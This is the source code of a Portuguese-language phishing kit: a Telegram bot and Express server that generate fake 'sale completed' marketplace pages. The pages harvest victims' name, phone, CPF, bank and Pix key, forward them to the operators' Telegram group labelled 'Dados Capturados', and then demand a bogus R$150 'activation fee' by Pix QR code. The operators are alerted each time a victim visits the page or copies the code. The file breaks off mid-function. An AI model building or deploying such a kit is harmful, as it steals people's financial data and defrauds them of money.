const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN)
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID
const DATA_FILE = 'data.json';
const RENDER_URL = process.env.RENDER_URL 



// inicia mue server
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

setInterval(() => {
  fs.writeFileSync(DATA_FILE, JSON.stringify({ produtos: {}, acoes: {} }, null, 2));
  console.log("🗑️ Dados do data.json apagados automaticamente a cada 24 horas.");
}, 24 * 60 * 60 * 1000); 



function loadData() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (error) {
    return { produtos: {}, acoes: {} };
  }
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

async function extrairDados(url) {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  try {
    await page.goto(url, {
      waitUntil: 'networkidle0',
      timeout: 60000,
    });
    // Aguarda que o seletor da descrição esteja disponível
    await page.waitForSelector('p.l-product-details__description-text', { timeout: 10000 });
    // Aguarda que o seletor do nome do produto esteja disponível
    await page.waitForSelector('h1.o-text.-xs-semibold.-xs-extra-dark.-xs-lowercase.l-about__title', { timeout: 10000 });

    // Extraindo o nome do produto
    const productName = await page.evaluate(() => {
      const nameElement = document.querySelector('h1.o-text.-xs-semibold.-xs-extra-dark.-xs-lowercase.l-about__title');
      return nameElement ? nameElement.innerText.trim() : 'Nome do produto não encontrado';
    });

    // Extraindo o nome do vendedor
    const sellerName = await page.evaluate(() => {
      const sellerElement = document.querySelector('span.l-store-info__seller-title');
      return sellerElement ? sellerElement.innerText.trim() : 'Nome do vendedor não encontrado';
    });

    const productImages = await page.evaluate(() => {
      const imageElements = document.querySelectorAll('img.c-photo-gallery__image');
      return Array.from(imageElements).slice(0, 2).map(img => img.getAttribute('src'));
    });

    const productDescription = await page.evaluate(() => {
      const descriptionElement = document.querySelector('p.l-product-details__description-text');
      return descriptionElement ? descriptionElement.innerText.trim() : 'Descrição do produto não encontrada';
    });

    const location = await page.evaluate(() => {
      const locationElement = document.querySelector('span.l-store-info__seller-subtitle');
      return locationElement ? locationElement.innerText.trim() : 'Localização não encontrada';
    });

    const productPrice = await page.evaluate(() => {
      const priceElement = document.querySelector('span[data-test="div-preco-produto"]');
      return priceElement ? priceElement.innerText.trim() : 'Preço não encontrado';
    });

    await browser.close();

    return {
      productName,         // Novo campo com o nome do produto
      nome: sellerName,    // Nome do vendedor
      imagens: productImages,
      descricao: productDescription,
      localizacao: location,
      preco: productPrice,
    };
  } catch (error) {
    await browser.close();
    throw error;
  }
}



let produtos = {}; 
let acoes = {};

// comand /novo
bot.command('novo', async (ctx) => {
  const userId = ctx.from.id;
  const data = loadData();
  const produtoId = Math.random().toString(36).slice(2, 11);
  data.produtos[produtoId] = {
    id: produtoId,
    userId,
    etapa: 'url',
    url: '',
    dataVenda: '',
    codigo: '',
    timestamp: Date.now()
  };
  saveData(data);
  await ctx.reply('Envie a URL do produto:');
});

// Handler para capturar as respostas do usuário conforme a etapa do cadastro
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  const data = loadData();

  // Procura entre os produtos o cadastro que esteja em andamento para o usuário
  const produto = Object.values(data.produtos).find(p => p.userId === userId && p.etapa !== 'finalizado');

  if (produto) {
    switch (produto.etapa) {
      case 'url':
        produto.url = text;
        produto.etapa = 'dataVenda';
        saveData(data);
        await ctx.reply('Digite a data da venda (ex: 28/01/2025):');
        break;
      case 'dataVenda':
        produto.dataVenda = text;
        produto.etapa = 'codigo';
        saveData(data);
        await ctx.reply('Digite o código do produto:');
        break;
      case 'codigo':
        produto.codigo = text;
        produto.etapa = 'finalizado';
        saveData(data);

        try {
          // Chama a função extrairDados() com a URL informada
          const productData = await extrairDados(produto.url);
          await ctx.reply(`✅ Produto cadastrado!
📦 Produto: ${productData.productName}
👤 Vendedor: ${productData.nome}
💰 Preço: ${productData.preco}
📍 Localização: ${productData.localizacao}
🖼️ Imagem1: ${productData.imagens[0] || 'Não encontrada'}
🖼️ Imagem2: ${productData.imagens[1] || 'Não encontrada'}
📅 Data da Venda: ${produto.dataVenda}
🔢 Código: ${produto.codigo}`);
        } catch (error) {
          console.error('Erro ao extrair dados:', error);
          await ctx.reply('❌ Erro ao buscar os dados do produto. Verifique a URL e tente novamente.');
        }
        break;
      default:
        await ctx.reply('Comando não reconhecido. Use /novo para iniciar um novo cadastro.');
    }
  } else {
    await ctx.reply('Nenhum cadastro em andamento encontrado. Use o comando /novo para iniciar.');
  }
});


const puppeteer = require('puppeteer');




bot.command('qr', async (ctx) => {
  console.log('[LOG] Comando /qr recebido:', ctx.message.text);

  const [_, produtoId, novoCodigo] = ctx.message.text.split(' ');
  console.log('[LOG] produtoId:', produtoId, 'novoCodigo:', novoCodigo);


  if (!produtoId || !novoCodigo) {
       
    console.log('[ERRO] Formato inválido');
    return await ctx.reply('❌ Use: /qr <ID_Produto> <Novo_Código>');
  }


  const sanitizedProdutoId = produtoId.trim();
  const sanitizedNovoCodigo = novoCodigo.trim();

  // Carregar dados
  let data;
  try {
    data = loadData();
  } catch (error) {
    console.error('[ERRO] Falha ao carregar dados:', error);
    return await ctx.reply('❌ Erro ao carregar dados. Tente novamente mais tarde.');
  }

  // Verificar se o produto existe
  const produto = data.produtos[sanitizedProdutoId];
  if (!produto) {
    console.log('[ERRO] Produto não encontrado');
    return await ctx.reply('❌ Produto não encontrado!');
  }


  produto.qr = sanitizedNovoCodigo;

  // Salvar dados
  try {
    saveData(data);
    console.log('[LOG] Código atualizado:', sanitizedNovoCodigo);
    await ctx.reply(`✅ Código atualizado!\nNovo código: ${sanitizedNovoCodigo}`);
  } catch (error) {
    console.error('[ERRO] Falha ao salvar dados:', error);
    await ctx.reply('❌ Erro ao salvar dados. Tente novamente mais tarde.');
  }
});


bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const data = loadData(); // Carrega os dados do arquivo
  
    if (produtos[userId]) {
      const produto = produtos[userId];
      switch (produto.etapa) {
        case 'vendedor':
          produto.vendedor = text;
          produto.etapa = 'produto';
          data.produtos[produto.id] = produto; 
          saveData(data);
          await ctx.reply('Digite o nome do produto:');
          break;
        case 'produto':
          produto.nome = text;
          produto.etapa = 'descricao';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a descrição do produto:');
          break;
        case 'descricao':
          produto.descricao = text;
          produto.etapa = 'valor';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite o valor do produto (ex: 500):');
          break;
        case 'valor':
          produto.valor = text;
          produto.etapa = 'imagem1';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Envie a URL da primeira imagem do produto:');
          break;
        case 'imagem1':
          produto.imagem1 = text;
          produto.etapa = 'imagem2';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Envie a URL da segunda imagem do produto:');
          break;
        case 'imagem2':
          produto.imagem2 = text;
          produto.etapa = 'data';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a data da venda (ex: 28/01/2025):');
          break;
        case 'data':
          produto.dataVenda = text;
          produto.etapa = 'regiao';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a região do vendedor (ex: São Paulo - SP):');
          break;
        case 'regiao':
          produto.regiao = text;
          produto.etapa = 'qr'; 
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite o código QR:');
          break;
        case 'qr':
          produto.qr = text; 
          produto.etapa = 'finalizado';
  
          
          const actionId = Math.random().toString(36).substr(2, 9);
          data.acoes[actionId] = { produtoId: produto.id, redirectTo: 'https://exemplo.com/dados-bancarios' };
          produto.actionId = actionId;
  
          data.produtos[produto.id] = produto;
          saveData(data); 
  
          await ctx.reply(`✅ Produto cadastrado! Acesse: ${RENDER_URL}/produtos?id=${produto.id}`);
          await ctx.reply(`id de mudança de URL ${actionId}`);
          break;
        default:
          await ctx.reply('Comando não reconhecido ou cadastro já finalizado. E /novo ou /qr fdp');
      }
    }
  });
  // Configuração do Webhook para produção
if (process.env.NODE_ENV === 'production') {
    bot.telegram.setWebhook(`${RENDER_URL}/bot${bot.token}`);
    app.use(bot.webhookCallback(`/bot${bot.token}`));
} else {
    bot.launch(); // Só usa polling em desenvolvimento
}

  app.get('/produtos', (req, res) => {
    const id = req.query.id;
    const data = loadData(); 
  

    const produto = data.produtos[id];
  
    if (!produto) {
      return res.status(404).send('Produto não encontrado!');
    }
  

    const acao = data.acoes[produto.actionId];
  
    if (!acao) {
      return res.status(404).send('Ação não encontrada!');
    }
  
    const mensagemProduto = `
      🎰 Vitima Acessou o Site UpUp!
      - 📌 Produto: ${produto.nome}
      - 🏷️ Vendedor: ${produto.vendedor}
      - 📅 Data da Venda: ${produto.dataVenda}
      - 🏦 Valor: R$ ${produto.valor}
      - 🆔️ ID: ${produto.actionId}
    `;
  
    // Envia a mensagem para o grupo do Telegram
    bot.telegram.sendMessage(GROUP_CHAT_ID, mensagemProduto, { parse_mode: "Markdown" });
  
    // Renderiza a página do produto
    res.send(`

        <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${produto.nome}</title>
        <style>
            body {
                font-family: 'Poppins', sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f4f4f4;
                color: black;
            }

            header {
                background-color: white;
                color: black;
                padding: 0.8rem 1rem;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: left;
                font-size: 1.2rem;
                border-bottom: 2px solid #ddd;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            header img {
                width: 50px;
                height: 50px;
                margin-right: 10px;
            }

            .container {
                max-width: 900px;
                margin: 5rem auto;
                background: white;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                border-radius: 12px;
                padding: 20px;
            }

            .product-images {
                display: flex;
                overflow-x: auto;
                padding: 10px;
                gap: 1rem;
            }

            .product-images img {
                width: 60%;
                max-width: 300px;
                border-radius: 8px;
                transition: transform 0.3s;
            }

            .product-images img:hover {
                transform: scale(1.05);
            }

            .sale-bubble {
                background-color:#4caf50;
                color: white;
                padding: 0.8rem;
                text-align: center;
                font-size: 1.1rem;
                font-weight: bold;
                margin: 15px 0;
                border-radius: 8px;
            }

            .details h1 {
                margin: 0 0 1rem;
                font-size: 2rem;
                color: #61005E;
            }

            .details p {
                margin: 0.5rem 0;
                font-size: 1.1rem;
            }

            .seller-info {
                display: flex;
                align-items: center;
                margin-top: 20px;
            }

            .seller-info img {
                border-radius: 50%;
                width: 60px;
                height: 60px;
                margin-right: 10px;
            }

            footer {
                background-color: #61005E;
                color: rgba(255, 255, 255, 0.801);
                padding-top: 10px;
                padding-bottom: 10px;
                text-align: center;
                font-size: 1rem;
                width: 100%;
                margin-top: 0;
                position: relative;
                bottom: 0;
            }

            footer a {
                color: rgb(255, 255, 255);
                font-weight: bold;
            }

            footer p {
                font-size: small;
                margin-top: 0px;
                margin-bottom: 0px;
            }

            footer a:hover {
                text-decoration: underline;
            }

            .modal {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.5);
                display: flex;
                justify-content: center;
                align-items: center;
                visibility: hidden;
                opacity: 0;
                transition: visibility 0s, opacity 0.3s;
            }

            .modal.active {
                visibility: visible;
                opacity: 1;
            }

            .modal-content {
                background: white;
                padding: 2rem;
                border-radius: 12px;
                text-align: center;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            }

            .modal-content h2 {
                color: #61005E;
            }

            .modal-content button {
                background-color:rgb(120, 0, 122);
                color: white;
                border: none;
                padding: 0.5rem 1rem;
                font-size: 1rem;
                border-radius: 8px;
                cursor: pointer;
            }

            .modal-content button:hover {
                background-color: rgb(120, 0, 122);
            }
        </style>
    </head>
    <body>
        <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>

        <div class="container">
            <div class="seller-info">
                <img src="https://cdn-icons-png.flaticon.com/512/4794/4794936.png" alt="Imagem do vendedor">
                <div>
                    <p><strong>Vendedor:</strong> ${produto.vendedor}</p>
                    <p><strong>Cidade:</strong> ${produto.regiao}</p>
                    <p><strong>Vendedor desde:</strong> Jan/2025</p>
                </div>
            </div>

            <div class="product-images">
                <img src="${produto.imagem1}" alt="Imagem do produto 1">
                <img src="${produto.imagem2}" alt="Imagem do produto 2">
            </div>

            <div class="sale-bubble">
                Venda realizada com sucesso!
            </div>

            <div class="details">
                <h1>${produto.nome}</h1>
                <p><strong>Valor:</strong> ${produto.valor}</p>
                <p><strong>Descrição:</strong> ${produto.descricao}</p>
            </div>

            <div class="details">
                <h2>Informações da Venda</h2>
                <p><strong>Data da venda:</strong> ${produto.dataVenda}</p>
                <p><strong>Comprador:</strong> Juliane Santos</p>
                <p><strong>Cidade do comprador:</strong> ${produto.regiao}</p>
            </div>
        </div>

        <div id="modal" class="modal">
            <div class="modal-content">
                <h2><strong>Parabéns pela sua venda!</strong></h2>
                <p style="padding-left: 5px; padding-right: 5px;">
                    Sua venda foi concluída com sucesso. Clique abaixo para fornecer os dados bancários e garantir o pagamento rápido e seguro. Continue vendendo com sucesso!
                </p>
                <button onclick="window.location.href='${RENDER_URL}/pagina-secundaria?id=${produto.actionId}'">Avançar</button>
            </div>
        </div>

        <footer>
            <p>Ao vender pelo nosso aplicativo, você estará concordando com os <a href="#">Termos de Uso</a> e nossa <a href="#">Política de Privacidade</a>.</p>
        </footer>

        <script>
            function showModal() {
                document.getElementById('modal').classList.add('active');
            }

            function closeModal() {
                document.getElementById('modal').classList.remove('active');
            }

            // Exibe o modal após 5 segundos
            setTimeout(showModal, 4000);
        </script>
    </body>
    </html>
      
    `);
  });

  app.get('/pagina-secundaria', (req, res) => {
    const actionId = req.query.id;
    const data = loadData(); 
  
   
    const acao = data.acoes[actionId];
  
    if (!acao) {
      return res.status(404).send('Ação não encontrada!');
    }
  
    
    res.send(`
      <!DOCTYPE html>
      <html lang="pt-br">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Informações Bancárias</title>
          <style>
              body {
                  font-family: 'Poppins', sans-serif;
                  margin: 0;
                  padding: 0;
                  background-color: #f3e5f5;
                  color: black;
              }
  
              header {
                  background-color: white;
                  color: black;
                  padding: 0.8rem 1rem;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  text-align: left;
                  font-size: 1.2rem;
                  border-bottom: 2px solid #ddd;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  z-index: 1000;
                  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
              }
  
              header img {
                  width: 50px;
                  height: 50px;
                  margin-right: 10px;
              }
  
              .venda-realizada {
                  background-color: #61005E;
                  color: white;
                  text-align: center;
                  padding: 1.5rem;
                  font-size: 1.5rem;
                  font-weight: bold;
                  margin-top: 80px;
              }
  
              .form-container {
                  max-width: 500px;
                  margin: 2rem auto;
                  background: white;
                  padding: 2rem;
                  border-radius: 12px;
                  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
                  margin-top: 60px;
              }
  
              .form-container h2 {
                  margin-bottom: 1.5rem;
                  color: #95008e;
                  text-align: center;
              }
  
              .form-container label {
                  display: block;
                  margin-bottom: 0.5rem;
                  font-weight: bold;
              }
  
              .form-container input,
              .form-container select {
                  width: 100%;
                  padding: 0.5rem;
                  margin-bottom: 1rem;
                  border: 1px solid #ddd;
                  border-radius: 8px;
                  font-size: 1rem;
              }
  
              .form-container button {
                  background-color: #95008e;
                  color: white;
                  border: none;
                  padding: 0.5rem 1rem;
                  font-size: 1rem;
                  border-radius: 8px;
                  cursor: pointer;
                  width: 100%;
              }
  
              .form-container button:hover {
                  background-color: #7b1fa2;
              }
  
              .form-container img {
                  width: 100%;
                  margin-top: 1rem;
                  margin-bottom: 1rem;
              }
  
              footer {
                  background-color: #61005E;
                  color: rgba(255, 255, 255, 0.801);
                  padding-top: 10px;
                  padding-bottom: 10px;
                  text-align: center;
                  font-size: 1rem;
                  width: 100%;
                  margin-top: 0;
                  position: relative;
                  bottom: 0;
              }
  
              footer a {
                  color: rgb(255, 255, 255);
                  font-weight: bold;
              }
  
              footer p {
                  font-size: small;
                  margin-top: 0px;
                  margin-bottom: 0px;
              }
  
              footer a:hover {
                  text-decoration: underline;
              }
  
              @media screen and (max-width: 768px) {
                  header {
                      padding: 0.7rem 1rem;
                      font-size: 1.1rem;
                  }
  
                  .venda-realizada {
                      font-size: 1.2rem;
                      padding: 1rem;
                  }
  
                  .form-container {
                      padding: 1.5rem;
                      margin: 1rem;
                  }
              }
  
              @media screen and (max-width: 480px) {
                  header {
                      font-size: 1rem;
                      padding: 0.6rem 1rem;
                  }
  
                  .venda-realizada {
                      font-size: 1rem;
                      padding: 0.8rem;
                  }
  
                  .form-container {
                      padding: 1rem;
                      margin: 0.5rem;
                  }
              }
          </style>
      </head>
      <body>
      <style>
       header {
                  background-color: white;
                  color: black;
                  padding: 0.8rem 1rem;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  text-align: left;
                  font-size: 1.2rem;
                  border-bottom: 2px solid #ddd;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  z-index: 1000;
                  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
              }
  
              header img {
                  width: 50px;
                  height: 50px;
                  margin-right: 10px;
              }
      </style>
         <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
  
          <div class="venda-realizada">
              Receba seu Pagamento
          </div>
  
          <div class="form-container">
              <h2>Preencha seus Dados Bancários</h2>
              <form action="${RENDER_URL}/confirmar?id=${actionId}" method="POST" id="form-dados-bancarios" onsubmit="return validarFormulario();">
                  <label for="nome">Nome Completo:</label>
                  <input type="text" id="nome" name="nome" placeholder="Seu nome completo" required>
  
                  <label for="telefone">Telefone:</label>
                  <input type="tel" id="telefone" name="telefone" placeholder="Seu número de telefone" required
                      pattern="\+?[0-9\s\-\(\)]{10,15}" title="Digite um número de telefone válido">
  
                  <label for="cpf">CPF:</label>
                  <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
  
                  <label for="banco">Banco:</label>
                  <input type="text" id="banco" name="banco" placeholder="Nome do banco" required>
  
                  <p>Aceitamos todos os bancos</p>
                  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZldct4y1ni1qQCcZO0GSYb9SCyD5pGC0hmQ&s"
                      alt="Imagem de todos os bancos">
  
                  <label for="chave-pix">Escolha a chave Pix:</label>
                  <select id="chave-pix" name="chave-pix" onchange="atualizarPlaceholder()" required>
                      <option value="cpf">CPF</option>
                      <option value="cnpj">CNPJ</option>
                      <option value="email">E-mail</option>
                      <option value="telefone">Telefone</option>
                      <option value="chave-aleatoria">Chave Aleatória</option>
                  </select>
  
                  <label for="chave">Chave Pix:</label>
                  <input type="text" id="chave" name="chave" placeholder="Digite a chave Pix escolhida" required>
  
                  <div id="alerta" style="display: none; color: red; font-size: 0.9rem; margin-bottom: 15px;">
                      Todos os campos são obrigatórios e o CPF deve ser válido.
                  </div>
  
                  <button type="submit">Confirmar Dados</button>
              </form>
          </div>
  
          <footer>
              <p>Ao confirmar seus dados, você estará concordando com nossos <a href="#">Termos de Uso</a> e nossa <a
                      href="#">Política de Privacidade</a>. Garantimos a máxima segurança para você!</p>
          </footer>
  
          <script>
              function atualizarPlaceholder() {
                  var select = document.getElementById('chave-pix');
                  var chavePix = select.value;
                  var inputChave = document.getElementById('chave');
  
                  switch (chavePix) {
                      case 'cpf':
                          inputChave.placeholder = 'Digite seu CPF (Ex: 000.000.000-00)';
                          break;
                      case 'cnpj':
                          inputChave.placeholder = 'Digite seu CNPJ (Ex: 00.000.000/0001-00)';
                          break;
                      case 'email':
                          inputChave.placeholder = 'Digite seu E-mail';
                          break;
                      case 'telefone':
                          inputChave.placeholder = 'Digite seu Telefone (Ex: (00) 00000-0000)';
                          break;
                      case 'chave-aleatoria':
                          inputChave.placeholder = 'Digite sua Chave Aleatória';
                          break;
                      default:
                          inputChave.placeholder = 'Digite a chave Pix escolhida';
                          break;
                  }
              }
  
              function validarCPF(cpf) {
                  cpf = cpf.replace(/\D/g, '');
  
                  const pattern = new RegExp("^(.)\\1{10}$");
  
                  if (cpf.length !== 11 || pattern.test(cpf)) return false;
  
                  let soma = 0, resto;
  
                  for (let i = 0; i < 9; i++) {
                      soma += parseInt(cpf[i]) * (10 - i);
                  }
                  resto = (soma * 10) % 11;
                  if (resto === 10 || resto === 11) resto = 0;
                  if (resto !== parseInt(cpf[9])) return false;
  
                  soma = 0;
                  for (let i = 0; i < 10; i++) {
                      soma += parseInt(cpf[i]) * (11 - i);
                  }
                  resto = (soma * 10) % 11;
                  if (resto === 10 || resto === 11) resto = 0;
                  if (resto !== parseInt(cpf[10])) return false;
  
                  return true;
              }
  
              function validarFormulario() {
                  var campos = document.querySelectorAll(
                      '#form-dados-bancarios input[required], #form-dados-bancarios select[required]');
                  var alerta = document.getElementById('alerta');
                  var valido = true;
  
                  campos.forEach(function(campo) {
                      if (!campo.value.trim()) {
                          valido = false;
                          campo.style.border = '1px solid red';
                      } else {
                          campo.style.border = '1px solid #ddd';
                      }
                  });
  
                  var cpf = document.getElementById('cpf').value;
                  if (!validarCPF(cpf)) {
                      valido = false;
                      document.getElementById('cpf').style.border = '1px solid red';
                  }
  
                  if (!valido) {
                      alerta.style.display = 'block';
                  } else {
                      alerta.style.display = 'none';
                  }
  
                  return valido;
              }
          </script>
      </body>
      </html>
    `);
  });




app.post('/confirmar', async (req, res) => {
    const { nome, telefone, cpf, banco, chave } = req.body; 
    const actionId = req.query.id;
    const data = loadData();
  
   
    const acao = data.acoes[actionId];
    if (!acao) {
        return res.status(404).send('Ação não encontrada!');
    }

   
    const produtoId = acao.produtoId;
    const produto = data.produtos[produtoId];


    if (!nome || !telefone || !cpf || !banco || !chave) {
        return res.status(400).send('Todos os campos são obrigatórios!');
    }


    if (!produto) {
        return res.status(404).send('Produto não encontrado');
    }

  
    const mensagem = `
    ♦️7️⃣ Dados Capturados UpUp!
    ━━━━━━━━━━━━━━━━━━━━━
    ▫️ Nome: ${nome}
    ▫️ Telefone: ${telefone}
    ▫️ CPF: ${cpf}
    ▫️ Banco: ${banco}
    ▫️ Chave Pix: ${chave}
    ━━━━━━━━━━━━━━━━━━━━━
    ✅ Dados validados com sucesso!`;

    try {
        await bot.telegram.sendMessage(GROUP_CHAT_ID, mensagem, { parse_mode: 'Markdown' });
        res.send(`
            <!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento da Taxa</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>
<body class="bg-white text-gray-800">
   <style>
    header {
                background-color: white;
                color: black;
                padding: 0.8rem 1rem;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: left;
                font-size: 1.2rem;
                border-bottom: 2px solid #ddd;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            header img {
                width: 50px;
                height: 50px;
                margin-right: 10px;
            }

   </style>
    <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
    <div class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-purple-500">
            <h2 class="text-xl font-bold text-purple-700 mb-4">Parabéns pela venda!</h2>
            <p class="text-gray-700 mb-3">No entanto, você ainda não atingiu a pontuação necessária como vendedor em nossa plataforma. Para garantir a segurança de todos, implementamos uma política para prevenir fraudes e garantir que somente vendedores confiáveis possam concluir transações.</p>
            <h3 class="text-lg font-bold text-purple-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
            <p class="text-gray-700 mb-3">Por questão de segurança e para garantir que você realmente deseja vender seu produto, será cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes em nosso sistema. Não se preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-purple-500">R$ 150,00</span></p>
            <button id="btnPagar" class="bg-purple-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-purple-600">Pagar Taxa</button>
        </div>
    </div>

    <!-- Modal QR Code -->
    <div id="modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
        <div class="bg-white p-6 rounded-lg shadow-lg text-center relative w-96">
            <h3 class="text-lg font-bold text-purple-700 mb-2">QR Code para Pagamento</h3>
            <div id="qrcode" class="my-4"></div>
            <button id="btnCopiar" class="bg-purple-700 text-white px-4 py-2 rounded-lg w-full hover:bg-purple-800">Copiar Código</button>
            <button id="btnRedirecionar" class="hidden bg-blue-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-blue-600">
    Confirmar Pagamento
</button>

            <button id="btnFechar" class="absolute top-2 right-2 text-gray-500">&times;</button>
        </div>
    </div>

    <script>
        document.getElementById("btnPagar").addEventListener("click", function () {
            document.getElementById("modal").classList.remove("hidden");
            new QRCode(document.getElementById("qrcode"), {
                text: "${produto.qr}", // Substitua pelo link real de pagamento
                width: 200,
                height: 200
            });
        });
        document.getElementById("btnCopiar").addEventListener("click", function () {
    const codigo = "${produto.qr}"; 
    const actionId = "${produto.actionId}"; 

    navigator.clipboard.writeText(codigo).then(() => {
        fetch("/notificar-copia", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ 
                codigo: codigo,
                actionId: actionId
            })
        });

        // Aguarda 20 segundos para mostrar o botão
        setTimeout(() => {
            document.getElementById("btnRedirecionar").classList.remove("hidden");
        }, 20000);
    });
});

// Adiciona o evento de clique no botão que aparecerá depois
document.getElementById("btnRedirecionar").addEventListener("click", function () {
    window.location.href = "${RENDER_URL}/analise?id=${produto.actionId}";
});




        document.getElementById("btnFechar").addEventListener("click", function () {
            document.getElementById("modal").classList.add("hidden");
            document.getElementById("qrcode").innerHTML = ""; // Limpa o QR Code ao fechar
        });

        document.getElementById("btnCopiar").addEventListener("click", function () {
            const codigo = "${produto.qr}"; // Substitua pelo link real
            navigator.clipboard.writeText(codigo).then(() => {
                
            });
        });
    </script>
</body>
</html>


        `);
    } catch (error) {
        console.error('Erro:', error);
        res.status(500).send('Ocorreu um erro no processamento');
    }
});

const multer = require('multer');
const upload = multer({ dest: 'uploads/' });
function escapeMarkdownV2(text) {
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}


app.post("/notificar-copia", async (req, res) => {
    console.log("📩 Dados recebidos no servidor:", req.body);

    const { codigo, actionId } = req.body;
    if (!codigo || !actionId) {
        return res.status(400).json({ error: "Código ou ActionId não fornecido!" });
    }

    const data = loadData();
    const acao = data.acoes[actionId];
    
    if (!acao) {
        return res.status(404).json({ error: "Ação não encontrada!" });
    }

    const produto = data.produtos[acao.produtoId];

    if (!produto) {
        return res.status(404).json({ error: "Produto não encontrado!" });
    }

    const chatId = process.env.GROUP_CHAT_ID;
    if (!chatId) {
        console.error("❌ ERRO: GROUP_CHAT_ID não está definido!");
        return res.status(500).json({ error: "Configuração inválida do servidor." });
    }

    // Apenas o ID do produto na mensagem
    const mensagem = `📢🃏  .@. O código foi copiado para o produto: \`${escapeMarkdownV2(produto.id)}\``;

    try {
        await bot.telegram.sendMessage(chatId, mensagem, { parse_mode: "MarkdownV2" });
        console.log("✅ Notificação enviada com sucesso!");
        res.status(200).json({ message: "Notificação enviada!" });
    } catch (error) {
